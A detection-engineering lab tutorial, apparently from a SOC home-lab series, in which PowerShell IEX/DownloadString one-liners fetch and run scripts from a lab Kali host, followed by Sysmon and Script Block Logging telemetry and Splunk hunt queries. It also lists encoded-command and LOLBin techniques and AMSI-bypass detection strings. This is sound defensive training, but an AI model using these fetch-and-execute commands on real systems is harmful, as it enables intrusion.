# ⚡ SOC Home Lab — Lab 2: PowerShell Payload Delivery & Detection Engineering

> **Series:** SOC Home Lab | **Difficulty:** Intermediate | **Platform:** Windows 11 + Kali Linux + Splunk

---

## What You'll Build

A complete red-blue exercise: attack from Kali using PowerShell download-and-execute, then hunt down every breadcrumb in Splunk using Sysmon, Script Block Logging, and correlation queries. You'll see the full kill chain — from payload delivery to filesystem artifact — and know exactly how to detect each stage.

---

## Environment

| Component | Details |
|-----------|---------|
| Attacker | Kali Linux — `192.168.1.17` |
| Attacker Service | Python HTTP Server (port 8080) |
| Victim | Windows 11 |
| Monitoring | Sysmon v15.20 + PowerShell Script Block Logging |
| SIEM | Splunk Enterprise |

> **Prerequisite:** Complete [Lab 1](./Lab1_Sysmon_Integration.md) first. Sysmon Event ID 3 must be enabled and flowing to Splunk.

---

## The Technique: Download-and-Execute

```
attacker hosts payload → victim downloads it in memory → IEX runs it without touching disk
```

This is one of the most common initial access patterns defenders face. It abuses legitimate PowerShell functionality, leaves minimal on-disk artifacts, and is trivially easy to execute. Your job is to catch it anyway.

**ATT&CK Techniques in Play:**

| ID | Technique |
|----|-----------|
| T1059.001 | PowerShell |
| T1059 | Command and Scripting Interpreter |
| T1082 | System Information Discovery |
| T1016 | Network Configuration Discovery |

---

## Setup: Spin Up Your Attacker Infrastructure

On Kali, create your payloads and serve them:

```bash
mkdir ~/lab-payloads && cd ~/lab-payloads
```

Create `payload.ps1`:

```powershell
Write-Host "[*] Injection simulation triggered"
Write-Host "[*] User: $env:USERNAME"
ipconfig
```

Create `dropper.ps1`:

```powershell
$content = "injected data simulation"
$path = "C:\Windows\Temp\injected_test.txt"
$content | Out-File -FilePath $path
Write-Host "[*] File written to $path"
```

Serve them:

```bash
python3 -m http.server 8080
```

---

## Attack Scenario 1 — Recon Payload

**Goal:** Execute remotely, enumerate user context, run network discovery — all without dropping a file.

From the Windows endpoint:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.17:8080/payload.ps1')
```

**What just happened:**

```
Net.WebClient.DownloadString()   ← fetches payload.ps1 as a string
           ↓
Invoke-Expression (IEX)          ← executes that string directly in memory
           ↓
Write-Host + ipconfig            ← runs attacker's commands as the victim user
```

No file written. No AV scan triggered. Execution complete.

---

## Attack Scenario 2 — Dropper Payload

**Goal:** Simulate a payload that writes a persistence artifact to disk.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.17:8080/dropper.ps1')
```

**Expected output:**

```
[*] File written to C:\Windows\Temp\injected_test.txt
```

**Artifact created:**

```
C:\Windows\Temp\injected_test.txt
Contents: "injected data simulation"
```

This simulates a dropper writing a second-stage payload, a config file, or a persistence mechanism.

---

## Telemetry: What Got Logged

### Sysmon Event ID 1 — Process Creation

PowerShell spawned. This is your first alert opportunity.

Key fields to capture:

```
Image:          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine:    powershell.exe  (or with encoded flags — that's a bigger red flag)
ParentImage:    whatever launched it (cmd.exe, explorer.exe, a browser, etc.)
User:           DOMAIN\username
```

> 🚩 **Detection signal:** PowerShell with no visible command-line arguments is suspicious. Legitimate admin tasks usually have args.

---

### Sysmon Event ID 3 — Network Connection

The moment `DownloadString()` fires, PowerShell opens a socket.

```
Image:              powershell.exe
DestinationIp:      192.168.1.17
DestinationPort:    8080
Initiated:          true
```

> 🚩 **Detection signal:** `powershell.exe` connecting outbound to a non-standard port (not 80/443) is high-confidence suspicious.

---

### PowerShell Event ID 4104 — Script Block Logging

This is your gold mine. Windows logs the **full text of every script block** executed.

What got captured:

```
Scenario 1:
  Write-Host "[*] Injection simulation triggered"
  Write-Host "[*] User: $env:USERNAME"
  ipconfig

Scenario 2:
  $content = "injected data simulation"
  $path = "C:\Windows\Temp\injected_test.txt"
  $content | Out-File -FilePath $path
  Write-Host "[*] File written to $path"
```

You can see **exactly what the attacker's payload did**. No decryption. No deobfuscation. PowerShell decodes it for you before logging.

> 💡 **Why this works:** IEX executes the script in the current PowerShell session. Script Block Logging fires on execution, not on download — so even fileless payloads get captured.

---

### Sysmon Event ID 11 — File Creation

Only fires on Scenario 2 (the dropper).

```
TargetFilename:   C:\Windows\Temp\injected_test.txt
Image:            powershell.exe
CreationUtcTime:  [timestamp]
```

> 🚩 **Detection signal:** PowerShell writing to `C:\Windows\Temp\` is a classic staging location. Combine with EID 3 for a high-confidence alert.

---

## The Full Kill Chain Reconstructed

```
[T=0]  powershell.exe launches
       → Sysmon EID 1

[T+1s] powershell.exe connects to 192.168.1.17:8080
       → Sysmon EID 3

[T+2s] DownloadString() fetches payload, IEX executes it
       → PowerShell EID 4104 (full script content logged)

[T+3s] dropper.ps1 writes injected_test.txt
       → Sysmon EID 11

[CONFIRMED] Attack chain complete — all stages captured
```

---

## Correlation Matrix

| Kill Chain Stage | Log Source | Event ID | What You See |
|-----------------|------------|----------|-------------|
| Execution begins | Sysmon | 1 | `powershell.exe` spawns |
| C2 connection | Sysmon | 3 | Outbound to `192.168.1.17:8080` |
| Payload runs | PowerShell Ops | 4104 | Full script text |
| Artifact dropped | Sysmon | 11 | File written to Temp |

---

## Splunk Detection Queries

### Hunt: Any PowerShell Script Block Execution

```spl
index=main
source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
EventCode=4104
| table _time, ComputerName, ScriptBlockText
| sort -_time
```

### Hunt: DownloadString or IEX in Script Blocks

```spl
index=main
source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
EventCode=4104
("DownloadString" OR "IEX" OR "Invoke-Expression" OR "WebClient")
| table _time, ComputerName, ScriptBlockText
```

### Hunt: PowerShell Making Outbound Connections

```spl
index=main
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=3
Image="*powershell.exe"
| table _time, ComputerName, DestinationIp, DestinationPort, User
| sort -_time
```

### Hunt: PowerShell Writing to Suspicious Paths

```spl
index=main
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=11
Image="*powershell.exe"
(TargetFilename="*\Temp\*" OR TargetFilename="*\AppData\*" OR TargetFilename="*\ProgramData\*")
| table _time, ComputerName, TargetFilename, Image
```

### Correlation: Full Attack Chain in One Query

```spl
index=main
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 OR EventCode=3 OR EventCode=11)
Image="*powershell.exe"
| eval stage=case(
    EventCode=1, "1. Process Created",
    EventCode=3, "2. Network Connection",
    EventCode=11, "3. File Written"
  )
| table _time, stage, ComputerName, Image, DestinationIp, TargetFilename
| sort _time
```

---

## Extend This Lab

Once the basics work, push further:

**Obfuscation detection** — Encode your payload and see if logging still catches it:
```powershell
# Attacker uses base64 encoding to evade simple string matching
powershell -EncodedCommand <base64_payload>
```
Event ID 4104 still logs the decoded script. Signature evasion ≠ logging evasion.

**LOLBin pivots** — Replace `powershell.exe` with living-off-the-land binaries and retune your queries:
```
mshta.exe       → executes HTA files (HTML Application)
rundll32.exe    → loads arbitrary DLLs
regsvr32.exe    → "squiblydoo" technique
certutil.exe    → downloads files, decodes base64
```

**AMSI bypass detection** — Look for attempts to disable the Antimalware Scan Interface:
```spl
EventCode=4104 
("AmsiUtils" OR "amsiInitFailed" OR "Reflection.Assembly")
```

---

## Key Takeaways

- **Script Block Logging is the single best PowerShell telemetry source.** Enable it. Always.
- **`IEX` + `DownloadString` in the same script block = immediate escalation.**
- **Sysmon EID 3 on `powershell.exe` is high signal.** Powershell has no reason to call home on its own.
- **EID 11 ties execution to filesystem impact.** This is your "something was dropped" confirmation.
- **Correlation queries beat individual alerts.** A chain of events in sequence is evidence. A single event is a hint.

---

## Resources

- [PowerShell Script Block Logging — Microsoft Docs](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [Sysmon Event ID Reference](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events)
- [MITRE ATT&CK T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [Atomic Red Team — PowerShell Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md)
- [Splunk Security Content](https://github.com/splunk/security_content)

---

## What's Next

**Add persistence detection** — after a dropper runs, what does it leave behind? Registry keys, scheduled tasks, startup folder entries. Same correlation approach, new event IDs.

**Build a dashboard** — take the queries above and pin them to a Splunk dashboard. Real SOC work happens at a glance, not in a search bar.

---

*Part of the SOC Home Lab series. Built hands-on, docume
